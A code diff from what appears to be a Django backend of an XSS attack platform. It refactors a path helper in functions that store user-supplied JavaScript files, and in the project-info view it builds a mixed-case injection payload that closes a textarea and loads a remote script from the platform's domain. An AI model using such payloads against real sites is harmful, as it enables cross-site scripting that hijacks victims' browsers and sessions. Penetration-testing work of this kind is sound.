@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 from Web.DatabaseHub import UserInfo,CrossSiteScriptInfo,CrossSiteScriptProject
 from django.http import JsonResponse,HttpResponse
-from ClassCongregation import ErrorLog,GetJavaScriptFilePath,randoms
+from ClassCongregation import ErrorLog,GetPath,randoms
 import json
 import base64
 import re
@@ -77,13 +77,13 @@ def GenerateProject(request):#用来生成项目，并且生成文件和用户�
             Uid = UserInfo().QueryUidWithToken(UserToken)  # 如果登录成功后就来查询用户名
             if Uid != None and JavaScriptFileData!=None:  # 查到了UID,并且js数据不为空
                 UserOperationLogRecord(request, request_api="create_cross_site_script_project", uid=Uid)
-                GetJavaScriptFilePath().Result()#获取js文件路径
+
                 while True:#如果查询确实冲突了
                     JavaScriptSaveFileName=randoms().result(5)#文件名
                     QueryJavaScriptSaveFileNameValidity = CrossSiteScriptProject().RepeatInvestigation(file_name=JavaScriptSaveFileName)#判断文件是否重复
                     if not QueryJavaScriptSaveFileNameValidity:#如果不冲突的话跳出循环
                         break
-                JavaScriptSaveRoute = GetJavaScriptFilePath().Result() + JavaScriptSaveFileName  # 获得保存路径
+                JavaScriptSaveRoute = GetPath().JavaScriptFilePath() + JavaScriptSaveFileName  # 获得保存路径
                 with open(JavaScriptSaveRoute, 'w+',encoding='UTF-8') as f:
                     f.write(base64.b64decode(str(JavaScriptFileData).encode('utf-8')).decode('utf-8'))#文件内容还要加密
                 CrossSiteScriptProject().Write(file_name=JavaScriptSaveFileName,uid=Uid,project_name=ProjectName)#写到数据库表中
@@ -228,7 +228,7 @@ def ModifyProject(request):  # 用来修改XSS项目中的数据
                 AuthorityCheck = CrossSiteScriptProject().AuthorityCheck(uid=Uid,file_name=ProjectAssociatedFileName)  # 用来校检CrossSiteScript数据库中文件名和UID相对应
 
                 if AuthorityCheck:#判断文件是属于该用户,如果属于的话就对文件进行修改
-                    JavaScriptFilePath=GetJavaScriptFilePath().Result() + ProjectAssociatedFileName#获取文件位置
+                    JavaScriptFilePath=GetPath().JavaScriptFilePath() + ProjectAssociatedFileName#获取文件位置
                     with open(JavaScriptFilePath, 'w+',encoding='UTF-8') as f:
                         f.write(base64.b64decode(str(ProjectAssociatedFileData).encode('utf-8')).decode('utf-8'))  # 文件内容还要解密
                     return JsonResponse({'message': "文件内容覆盖成功~", 'code': 200, })
@@ -259,7 +259,7 @@ def QueryProjectInfo(request):  # 查询项目中详细信息
                 UserOperationLogRecord(request, request_api="query_cross_site_script_project_info", uid=Uid)
                 AuthorityCheck = CrossSiteScriptProject().AuthorityCheck(uid=Uid,file_name=ProjectAssociatedFileName)  # 用来校检CrossSiteScript数据库中文件名和UID相对应
                 if AuthorityCheck:#判断文件是属于该用户,如果属于的话就对文件进行修改
-                    JavaScriptFilePath=GetJavaScriptFilePath().Result() + ProjectAssociatedFileName#获取文件位置
+                    JavaScriptFilePath=GetPath().JavaScriptFilePath() + ProjectAssociatedFileName#获取文件位置
                     ReadFileData=open(JavaScriptFilePath, 'r',encoding='UTF-8').read()#读取文件内容
                     return JsonResponse({'message': {"project_associated_file_data":base64.b64encode(str(ReadFileData).encode('utf-8')).decode('utf-8'),
                                                      "the_first_use":"""</tExtArEa>'"><sCRiPt sRC=//"""+cross_site_script_uses_domain_names+"/s/"+ProjectAssociatedFileName+"></sCrIpT>",
